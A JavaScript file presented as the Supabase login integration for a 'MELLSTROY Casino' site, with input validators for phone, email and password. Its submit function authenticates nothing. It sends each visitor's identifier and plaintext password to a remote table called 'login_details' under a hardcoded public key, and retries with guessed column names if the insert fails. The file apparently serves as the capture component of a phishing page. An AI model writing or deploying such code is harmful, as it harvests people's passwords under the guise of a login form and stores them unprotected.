/**
 * Supabase Authentication & Database Integration for MELLSTROY Casino
 * Connected to project: vrdvgigueqswwlhcenwe
 */

const SUPABASE_AUTH_CONFIG = {
  url: "https://vrdvgigueqswwlhcenwe.supabase.co",
  anonKey: "sb_publishable_-jrTBNHdugQo6mQ6rF_cNw_yUP9Id4G",
  table: "login_details"
};

/**
 * Validate phone number
 * @param {string} phone
 * @returns {{ valid: boolean, error?: string }}
 */
function validatePhoneInput(phone) {
  const trimmed = (phone || "").trim();
  if (!trimmed) {
    return { valid: false, error: "Phone number error: Please enter your phone number" };
  }
  const digits = trimmed.replace(/\D/g, "");
  if (digits.length < 6) {
    return { valid: false, error: "Phone number error: Enter a valid phone number" };
  }
  return { valid: true };
}

/**
 * Validate email address
 * @param {string} email
 * @returns {{ valid: boolean, error?: string }}
 */
function validateEmailInput(email) {
  const trimmed = (email || "").trim();
  if (!trimmed) {
    return { valid: false, error: "Email error: Please enter your email address" };
  }
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(trimmed)) {
    return { valid: false, error: "Email error: Please enter a valid email address" };
  }
  return { valid: true };
}

/**
 * Validate password
 * @param {string} password
 * @returns {{ valid: boolean, error?: string }}
 */
function validatePasswordInput(password) {
  const trimmed = (password || "").trim();
  if (!trimmed) {
    return { valid: false, error: "Password error: Please enter your password" };
  }
  if (trimmed.length < 6) {
    return { valid: false, error: "Password error: Password must be at least 6 characters" };
  }
  return { valid: true };
}

/**
 * Clean and format phone number input
 * @param {string} val
 * @returns {string}
 */
function formatPhoneInput(val) {
  let cleaned = (val || "").replace(/[^\d\s+]/g, "");
  if (cleaned.includes("+")) {
    cleaned = "+" + cleaned.replace(/\+/g, "");
  }
  return cleaned;
}

/**
 * Submit login / registration details to Supabase table `login_details`
 * @param {Object} details { type: 'Phone' | 'Email', identifier: string, password: string }
 * @returns {Promise<{ success: boolean, error?: any }>}
 */
async function submitLoginToSupabase(details) {
  try {
    const timestamp = new Date().toISOString();

    // Primary payload matching existing table schema (id, type, identifier, password, timestamp)
    const payload = {
      type: details.type,
      identifier: details.identifier,
      password: details.password,
      timestamp: timestamp
    };

    let response = await fetch(`${SUPABASE_AUTH_CONFIG.url}/rest/v1/${SUPABASE_AUTH_CONFIG.table}`, {
      method: "POST",
      headers: {
        "apikey": SUPABASE_AUTH_CONFIG.anonKey,
        "Authorization": `Bearer ${SUPABASE_AUTH_CONFIG.anonKey}`,
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
      },
      body: JSON.stringify(payload)
    });

    // Fallback if table expects separate email / phone columns instead of type / identifier
    if (!response.ok && response.status === 400) {
      const errText = await response.text();
      console.warn("Schema mismatch detected, trying fallback columns:", errText);

      const altPayload = {
        email: details.type === "Email" ? details.identifier : null,
        phone: details.type === "Phone" ? details.identifier : null,
        password: details.password,
        timestamp: timestamp
      };

      response = await fetch(`${SUPABASE_AUTH_CONFIG.url}/rest/v1/${SUPABASE_AUTH_CONFIG.table}`, {
        method: "POST",
        headers: {
          "apikey": SUPABASE_AUTH_CONFIG.anonKey,
          "Authorization": `Bearer ${SUPABASE_AUTH_CONFIG.anonKey}`,
          "Content-Type": "application/json",
          "Prefer": "return=minimal"
        },
        body: JSON.stringify(altPayload)
      });
    }

    if (response.ok) {
      console.log("Successfully saved login details to Supabase.");
      return { success: true };
    } else {
      const errText = await response.text();
      console.error("Supabase insert error response:", response.status, errText);
      return { success: false, error: errText };
    }
  } catch (err) {
    console.error("Supabase network request failed:", err);
    return { success: false, error: err };
  }
}

// Export to window for global access
window.SUPABASE_AUTH_CONFIG = SUPABASE_AUTH_CONFIG;
window.submitLoginToSupabase = submitLoginToSupabase;
window.validatePhoneInput = validatePhoneInput;
window.validateEmailInput = validateEmailInput;
window.validatePasswordInput = validatePasswordInput;
window.formatPhoneInput = formatPhoneInput;
